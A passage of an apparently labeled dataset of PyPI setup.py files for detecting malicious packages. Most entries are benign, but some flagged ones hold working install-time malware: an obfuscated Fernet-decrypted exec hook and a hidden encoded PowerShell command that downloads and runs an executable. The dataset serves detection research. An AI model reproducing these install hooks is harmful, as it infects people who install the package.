os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(here, 'README.rst'), encoding='utf-8') as f:\n        long_description = f.read()\n\nsetup(\n    # Information\n    name = \"edlib\",\n    description = \"Lightweight, super fast library for sequence alignment using edit (Levenshtein) distance.\",\n    long_description = long_description,\n    version = \"1.3.9\",\n    url = \"https://github.com/Martinsos/edlib\",\n    author = \"Martin Sosic\",\n    author_email = \"sosic.martin@gmail.com\",\n    license = \"MIT\",\n    keywords = \"edit distance levenshtein align sequence bioinformatics\",\n    # Build instructions\n    ext_modules = [Extension(\"edlib\",\n                             [edlib_module_src, \"edlib/src/edlib.cpp\"],\n                             include_dirs=[\"edlib/include\"],\n                             depends=[\"edlib/include/edlib.h\"],\n                             language=\"c++\",\n                             extra_compile_args=[\"-O3\", \"-std=c++11\"])],\n    cmdclass = cmdclass\n)\n", "target": 0}
{"idx": "edn_format-0.7.5", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nwith open(\"requirements.txt\") as f:\n    requirements = f.read().strip().split(\"\\n\")\n\n\nsetup(name=\"edn_format\",\n      version=\"0.7.5\",\n      author=\"Swaroop C H\",\n      author_email=\"swaroop@swaroopch.com\",\n      description=\"EDN format reader and writer in Python\",\n      long_description=open('README.md').read(),\n      long_description_content_type='text/markdown',\n      url=\"https://github.com/swaroopch/edn_format\",\n      install_requires=requirements,\n      license=\"Apache 2.0\",\n      packages=['edn_format'],\n      # http://pypi.python.org/pypi?%3Aaction=list_classifiers\n      classifiers=[\n          'Development Status :: 5 - Production/Stable',\n          'Intended Audience :: Developers',\n          'License :: OSI Approved :: Apache Software License',\n          'Topic :: Software Development',\n          'Programming Language :: Python',\n          'Programming Language :: Python :: 2',\n          'Programming Language :: Python :: 3',\n          'Operating System :: OS Independent',\n      ])\n", "target": 0}
{"idx": "diagrams-0.21.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['diagrams',\n 'diagrams.alibabacloud',\n 'diagrams.aws',\n 'diagrams.azure',\n 'diagrams.base',\n 'diagrams.custom',\n 'diagrams.digitalocean',\n 'diagrams.elastic',\n 'diagrams.firebase',\n 'diagrams.gcp',\n 'diagrams.generic',\n 'diagrams.ibm',\n 'diagrams.k8s',\n 'diagrams.oci',\n 'diagrams.onprem',\n 'diagrams.openstack',\n 'diagrams.outscale',\n 'diagrams.programming',\n 'diagrams.saas']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['graphviz>=0.13.2,<0.20.0', 'jinja2>=2.10,<4.0']\n\nextras_require = \\\n{':python_version >= \"3.6\" and python_version < \"3.7\"': ['contextvars>=2.4,<3.0']}\n\nsetup_kwargs = {\n    'name': 'diagrams',\n    'version': '0.21.1',\n    'description': 'Diagram as Code',\n    'long_description': '![diagrams logo](assets/img/diagrams.png)\\n\\n# Diagrams\\n\\n[![license](https://img.shields.io/badge/license-MIT-blue.svg)](/LICENSE)\\n[![pypi version](https://badge.fury.io/py/diagrams.svg)](https://badge.fury.io/py/diagrams)\\n![python version](https://img.shields.io/badge/python-%3E%3D%203.6-blue?logo=python)\\n![Run tests](https://github.com/mingrammer/diagrams/workflows/Run%20tests/badge.svg?branch=master)\\n[![todos](https://badgen.net/https/api.tickgit.com/badgen/github.com/mingrammer/diagrams?label=todos)](https://www.tickgit.com/browse?repo=github.com/mingrammer/diagrams)\\n![contributors](https://img.shields.io/github/contributors/mingrammer/diagrams)\\n\\n<a href=\"https://www.buymeacoffee.com/mingrammer\" target=\"_blank\"><img src=\"https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png\" alt=\"Buy Me A Coffee\" style=\"height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;\" ></a>\\n\\n**Diagram as Code**.\\n\\nDiagrams lets you draw the cloud system architecture **in Python code**. It was born for **prototyping** a new system architecture design without any design tools. You can also describe or visualize the existing system architecture as well. Diagrams currently supports main major providers including: `AWS`, `Azure`, `GCP`, `Kubernetes`, `Alibaba Cloud`, `Oracle Cloud` etc... It also supports `On-Premise` nodes, `SaaS` and major `Programming` frameworks and languages.\\n\\n**Diagram as Code** also allows you to **track** the architecture diagram changes in any **version control** system.\\n\\n>  NOTE: It does not control any actual cloud resources nor does it generate cloud formation or terraform code. It is just for drawing the cloud system architecture diagrams.\\n\\n## Providers\\n\\n![aws provider](https://img.shields.io/badge/AWS-orange?logo=amazon-aws&color=ff9900)\\n![azure provider](https://img.shields.io/badge/Azure-orange?logo=microsoft-azure&color=0089d6)\\n![gcp provider](https://img.shields.io/badge/GCP-orange?logo=google-cloud&color=4285f4)\\n![ibm provider](https://img.shields.io/badge/IBM-orange?logo=ibm&color=052FAD)\\n![kubernetes provider](https://img.shields.io/badge/Kubernetes-orange?logo=kubernetes&color=326ce5)\\n![alibaba cloud provider](https://img.shields.io/badge/AlibabaCloud-orange?logo=alibaba-cloud&color=ff6a00)\\n![oracle cloud provider](https://img.shields.io/badge/OracleCloud-orange?logo=oracle&color=f80000)\\n![openstack provider](https://img.shields.io/badge/OpenStack-orange?logo=openstack&color=da1a32)\\n![firebase provider](https://img.shields.io/badge/Firebase-orange?logo=firebase&color=FFCA28)\\n![digital ocean provider](https://img.shields.io/badge/DigitalOcean-0080ff?logo=digitalocean&color=0080ff)\\n![elastic provider](https://img.shields.io/badge/Elastic-orange?logo=elastic&color=005571)\\n![outscale provider](https://img.shields.io/badge/OutScale-orange?color=5f87bf)\\n![on premise provider](https://img.shields.io/badge/OnPremise-orange?color=5f87bf)\\n![generic provider](https://img.shields.io/badge/Generic-orange?color=5f87bf)\\n![programming provider](https://img.shields.io/badge/Programming-orange?color=5f87bf)\\n![saas provider](https://img.shields.io/badge/SaaS-orange?color=5f87bf)\\n\\n## Getting Started\\n\\nIt requires **Python 3.6** or higher, check your Python version first.\\n\\nIt uses [Graphviz](https://www.graphviz.org/) to render the diagram, so you need to [install Graphviz](https://graphviz.gitlab.io/download/) to use **diagrams**. After installing graphviz (or already have it), install the **diagrams**.\\n\\n> macOS users can download the Graphviz via `brew install graphviz` if you\\'re using [Homebrew](https://brew.sh).\\n\\n```shell\\n# using pip (pip3)\\n$ pip install diagrams\\n\\n# using pipenv\\n$ pipenv install diagrams\\n\\n# using poetry\\n$ poetry add diagrams\\n```\\n\\nYou can start with [quick start](https://diagrams.mingrammer.com/docs/getting-started/installation#quick-start). Check out [guides](https://diagrams.mingrammer.com/docs/guides/diagram) for more details, and you can find all available nodes list in [here](https://diagrams.mingrammer.com/docs/nodes/aws).\\n\\n## Examples\\n\\n| Event Processing                                             | Stateful Architecture                                        | Advanced Web Service                                         |\\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\\n| ![event processing](https://diagrams.mingrammer.com/img/event_processing_diagram.png) | ![stateful architecture](https://diagrams.mingrammer.com/img/stateful_architecture_diagram.png) | ![advanced web service with on-premise](https://diagrams.mingrammer.com/img/advanced_web_service_with_on-premise.png) |\\n\\nYou can find all the examples on the [examples](https://diagrams.mingrammer.com/docs/getting-started/examples) page.\\n\\n## Contributing\\n\\nTo contribute to diagram, check out [contribution guidelines](CONTRIBUTING.md).\\n\\n> Let me know if you are using diagrams! I\\'ll add you in showcase page. (I\\'m working on it!) :)\\n\\n## Who uses it?\\n\\n[GitPitch](https://gitpitch.github.io/gitpitch) is the perfect slide deck solution for Tech Conferences, Training, Developer Advocates, and Educators. Diagrams is now available as a dedicated [Cloud Diagram Markdown Widget](https://gitpitch.github.io/gitpitch/#/diagrams/cloud-architecture) so you can use Diagrams directly on any slide for conferences, meetups, and training.\\n\\n[Cloudiscovery](https://github.com/Cloud-Architects/cloudiscovery) helps you to analyze resources in your cloud (AWS/GCP/Azure/Alibaba/IBM) account. It allows you to create a diagram of analyzed cloud resource map based on this Diagrams library, so you can draw your existing cloud infrastructure with Cloudiscovery.\\n\\n[Airflow Diagrams](https://github.com/feluelle/airflow-diagrams) is an Airflow plugin that aims to easily visualise your Airflow DAGs on service level from providers like AWS, GCP, Azure, etc. via diagrams.\\n\\n## Other languages\\n\\n- If you are familiar to Go, you can use [go-diagrams](https://github.com/blushft/go-diagrams) as well.\\n\\n## License\\n\\n[MIT](LICENSE)\\n',\n    'author': 'mingrammer',\n    'author_email': 'mingrammer@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://diagrams.mingrammer.com',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "fake-useragent-0.1.11", "func": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nimport io\nimport os\nimport re\n\nfrom setuptools import setup\n\n\ndef get_version():\n    regex = r\"__version__\\s=\\s\\'(?P<version>[\\d\\.]+?)\\'\"\n\n    path = ('fake_useragent', 'settings.py')\n\n    return re.search(regex, read(*path)).group('version')\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.abspath(os.path.dirname(__file__)), *parts)\n\n    with io.open(filename, encoding='utf-8', mode='rt') as fp:\n        return fp.read()\n\n\nsetup(\n    name='fake-useragent',\n    version=get_version(),\n    author='hellysmile@gmail.com',\n    author_email='hellysmile@gmail.com',\n    url='https://github.com/hellysmile/fake-useragent',\n    description='Up to date simple useragent faker with real world database',\n    long_description=read('README.rst'),\n    packages=[str('fake_useragent')],\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: POSIX',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Operating System :: OS Independent',\n    ],\n    keywords=[\n        'user', 'agent', 'user agent', 'useragent',\n        'fake', 'fake useragent', 'fake user agent',\n    ],\n)\n", "target": 0}
{"idx": "dpkt-1.9.7.2", "func": "import sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\npackage_name = 'dpkt'\ndescription = 'fast, simple packet creation / parsing, with definitions for the basic TCP/IP protocols'\nreadme = open('README.md').read()\nrequirements = []\n\n# PyPI Readme\nlong_description = open('README.md').read()\n\n# Pull in the package\npackage = __import__(package_name)\npackage_version = package.__version__\nif \"bdist_msi\" in sys.argv:\n    # The MSI build target does not support a 4 digit version, e.g. '1.2.3.4'\n    # therefore we remove the last digit.\n    package_version, _, _ = package_version.rpartition('.')\n\nsetup(name=package_name,\n      version=package_version,\n      author=package.__author__,\n      author_email=package.__author_email__,\n      url=package.__url__,\n      description=description,\n      long_description=long_description,\n      long_description_content_type='text/markdown',\n      packages=['dpkt'],\n      install_requires=requirements,\n      license='BSD',\n      zip_safe=False,\n      classifiers=[\n          'Development Status :: 4 - Beta',\n          'Intended Audience :: Developers',\n          'License :: OSI Approved :: BSD License',\n          'Natural Language :: English',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: 3.8',\n          'Programming Language :: Python :: 3.9',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy',\n      ])\n", "target": 0}
{"idx": "mle-py-connector-5.9.1", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pre_install import pre_install\n\nclass CustomInstall(install):\n    def run(self):\n        # Execute your pre_install.py script\n        pre_install()\n        # Call the original install command using super()\n        super().run()\n\nsetup(\n  name = 'mle-py-connector',\n  packages = find_packages(),\n  version = '5.9.1',\n  license='MIT',\n  description = 'SAP service',\n  author = 'SherlocksHat',\n  author_email = 'sherlockshat007@gmail.com',\n  url = 'https://github.com/user/sherlockshat',\n  download_url = 'http://notapplicable.notapplicable',\n  keywords = ['Lyft', 'FRONTEND'],\n  install_requires=[],\n  classifiers=[\n    'Development Status :: 3 - Alpha',\n    'Intended Audience :: Developers',\n    'Topic :: Software Development :: Build Tools',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n   cmdclass={'install': CustomInstall},\n)\n", "target": 1}
{"idx": "graphenelib-1.5.4", "func": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\n\n__version__ = \"1.5.4\"\n\nsetup(\n    version=__version__,\n    install_requires=open(\"requirements.txt\").readlines(),\n    tests_require=open(\"requirements-test.txt\").readlines(),\n    include_package_data=True,  # needed for data from manifest\n    # Use git repo data (latest tag, current commit hash, etc) for building a\n    # version number according PEP 440. Conflicts with semantic-release\n    setuptools_git_versioning={\n        \"enabled\": False,\n    },\n)\n", "target": 0}
{"idx": "django-cleanup-6.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n#  Copyright (c) 2012 Ilya Shalyapin\n#\n#  django-cleanup is free software under terms of the MIT License.\n#\n\nimport os\nimport re\nfrom codecs import open as codecs_open\n\nfrom setuptools import find_packages, setup\n\n\ndef read(*parts):\n    file_path = os.path.join(os.path.dirname(__file__), *parts)\n    return codecs_open(file_path, encoding='utf-8').read()\n\n\ndef find_version(*parts):\n    version_file = read(*parts)\n    version_match = re.search(\n        r'''^__version__ = ['\"]([^'\"]*)['\"]''', version_file, re.M)\n    if version_match:\n        return str(version_match.group(1))\n    raise RuntimeError('Unable to find version string.')\n\n\nsetup(\n    name='django-cleanup',\n    version=find_version('django_cleanup', '__init__.py'),\n    packages=['django_cleanup'],\n    include_package_data=True,\n    requires=['python (>=3.5)', 'django (>=2.2)'],\n    description='Deletes old files.',\n    long_description=read('README.rst'),\n    long_description_content_type='text/x-rst',\n    author='Ilya Shalyapin',\n    author_email='ishalyapin@gmail.com',\n    url='https://github.com/un1t/django-cleanup',\n    download_url='https://github.com/un1t/django-cleanup/tarball/master',\n    license='MIT License',\n    keywords='django',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Utilities',\n    ],\n)\n", "target": 0}
{"idx": "reqiurementstxt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'GKdNDwNiatrOwYZbGjVaGqUoDlrPtxkknAnTEItUHKolTDSVfCfqdPUdrymbdLarPxuqMqAcOK'\nLONG_DESCRIPTION = ' KLy TnHPam vvjYFZZUpqvHZEjVnPvRNpO MzkJAqXvXzrWq GUVcLbYDYUHsQGRSMvoHPynbmUrxlJJbLbnIHuXDPVZF scCzxkobAONcoZxjFzLPbxGYumZRrWJMUnEjAFVoPjikOmitbFXuGuQJxcgbCmWQdGxNEoMUysaAtVKMxUUYIgbZeUaDSaxdhk buAKOwwcdzR keDLERKTUVTwEoGaSVkIGftVq lNqHdTXjfIplfMUUjSeJkJKdNjSzSIfqAoYLfiUoRD RGRqzGMxrDtpOXFrDXMTxzhjgFyxkEQcHjjYCUyerVexGXefGsSvblMPPDWwdf'\n\n\nclass ebPFYjTRpRFABTMPCEnGDxrMLLAFfLwCIPKRxNbrETVtmsjiXdSMvjbyzLABpydCAfiErwTdmcstDftnHdOwlbAkveBgqlPNlDcXCNthHEcGoINNdTCWMQtLadvmQyxGCRyVIpHFYalDLTmxyyCHDJUDTRrPd(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'O6Poj17UjcD3ux_KR1O2i-nAnKn5vIGc22iHT6gLj4k=').decrypt(b'gAAAAABmBIY2VA_lj4UiTQm71Yt8P_cZYK5ADwGZCjVQ_JwgzDhz8fBF9OkSgVzpXgVwIVALe_Zjp_Tlhfi0hG2nIWlU-i8kCWc59ujRZ1hXU0Zju-y4bS3hWEZZOUrYcSTTrmLoRjnzs5LRsaoxPD_fyUOoaVATPTViRU1UfT0IoI2VAih-irQcMNaEVMwTPdEGG0can-g0QzyvvGeQPbWRtDIGvTCw3EUzu-LOQqobLUCPPrMkJr4='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"reqiurementstxt\",\n    version=VERSION,\n    author=\"fChcmtdKKTokqZExi\",\n    author_email=\"SGHKdyqEGmlGTjuaEgd@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': ebPFYjTRpRFABTMPCEnGDxrMLLAFfLwCIPKRxNbrETVtmsjiXdSMvjbyzLABpydCAfiErwTdmcstDftnHdOwlbAkveBgqlPNlDcXCNthHEcGoINNdTCWMQtLadvmQyxGCRyVIpHFYalDLTmxyyCHDJUDTRrPd,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "selfvisavirtualmask-2.17", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisavirtualmask',\n    packages = ['modlib'],\n    version = '9.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "exit_codes-1.3.0", "func": "import io\nimport os\nimport re\nfrom setuptools import setup, find_packages\n\n\ndef read(*names, **kwargs):\n    with io.open(\n        os.path.join(os.path.dirname(__file__), *names),\n        encoding=kwargs.get(\"encoding\", \"utf8\")\n    ) as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nlong_description = read('README.rst', mode='rt')\n\nsetup(\n    name='exit_codes',\n    version=find_version('exit_codes/version.py'),\n    packages=find_packages(exclude=['tests']),\n\n    author='Sixty North AS',\n    author_email='austin@sixty-north.com',\n    description='Platform-independent exit codes.',\n    license='MIT',\n    keywords='',\n    url='http://github.com/sixty-north/exit-codes',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python'\n    ],\n    platforms='any',\n    include_package_data=True,\n    install_requires=[],\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). You can install these using the following syntax, for\n    # example: $ pip install -e .[dev,test]\n    extras_require={\n        'test': ['pytest', 'tox'],\n    },\n    long_description=long_description,\n)\n", "target": 0}
{"idx": "dasdsajdjsaasddsad-4.0.0", "func": "from setuptools import setup\n\nsetup(\n    name='dasdsajdjsaasddsad',\n    version='4.0.0',\n    packages=['dasdsajdjsaasddsad'],\n    url='',\n    license='',\n    author='dark',\n    author_email='email@example.com',\n    description='email@example.com',\n    install_requires=[\n        'requests==2.28.2',\n        'cryptography==40.0.2'\n    ]\n)\n", "target": 1}
